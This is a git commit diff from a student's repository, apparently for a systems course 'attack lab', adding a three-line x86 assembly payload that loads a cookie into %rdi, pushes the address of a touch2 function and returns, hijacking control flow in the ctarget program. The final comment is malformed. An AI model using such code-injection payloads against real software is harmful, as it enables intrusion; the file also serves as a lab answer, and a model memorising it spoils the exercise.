f011d1ae322491e28b63bfe7ee764c1b1a5807a2
Ke Dong <kedong0810@gmail.com>
2019-05-27 15:59:58 -0400

    finish lab3 except phase5

---
+++ Lab3-target/ctarget.l2.s
@@ -0,0 +1,3 @@
+mov  $0x59b997fa, %rdi /* store the value of cookie into the first argument */
+push $0x4017ec  /* push the address of touch2 into the stack */
+ret      /* return to the address of touch2 *a/
